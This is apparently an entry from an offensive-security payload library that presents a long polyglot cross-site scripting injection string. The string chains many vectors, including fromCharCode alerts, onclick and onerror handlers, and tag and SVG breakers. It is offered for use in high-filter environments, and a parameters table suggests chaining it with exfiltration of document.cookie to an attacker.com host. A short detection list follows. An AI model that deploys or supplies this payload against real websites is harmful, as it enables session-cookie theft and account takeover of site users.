---
id: bbd8ab1c-954e-4bdb-8807-4f5b5c9b3d72
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.286183+00:00'
updated_at: '2023-04-10T20:21:55.867714+00:00'
tags:
  - xss
  - polyglot
  - combination
platforms:
  - Web
validated: true
---

# Comprehensive-Polyglot-XSS-Combination

## Code

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id=\"confirm&lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'"><img src=\"http://i.imgur.com/P8mL8.jpg\">\njavascript://'/</title></style></textarea></script>--><p\" onclick=alert()//>*/alert()/*\njavascript://--></script></title></style>\"/</textarea>*/<alert()/*' onclick=alert()//>a\njavascript://</title>\"/</script></style></textarea/--><alert()/*' onclick=alert()//>/\njavascript://</title></style></textarea>--></script><a\"//' onclick=alert()//>*/alert()/*\n--></script></title></style>\"/</textarea><a' onclick=alert()//>*/alert()/*\n/</title/'/</style/</script/</textarea/--><p\" onclick=alert()//>*/alert()/*\njavascript://--></title></style></textarea></script><svg \"'//' onclick=alert()//\n/</title/'/</style/</script/--><p\" onclick=alert()//>*/alert()/*
```

## Description

A concatenated polyglot combining multiple XSS vectors for broad compatibility, including fromCharCode, onclick, marquee, and SVG breakers to ensure execution in diverse contexts.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Various alerts | POC; chain with exfil | Add new Image().src='http://attacker.com?'+document.cookie |

## Usage

Use as a single injection string in high-filter environments; covers HTML, JS, CSS, and SVG parsers.

## Detection

- Long obfuscated strings with multiple tag closers.
- Combination of event handlers and breakers.

## Related

- [[procedures/Polyglot-XSS-Attack-using-SVG-Image-Injection]]
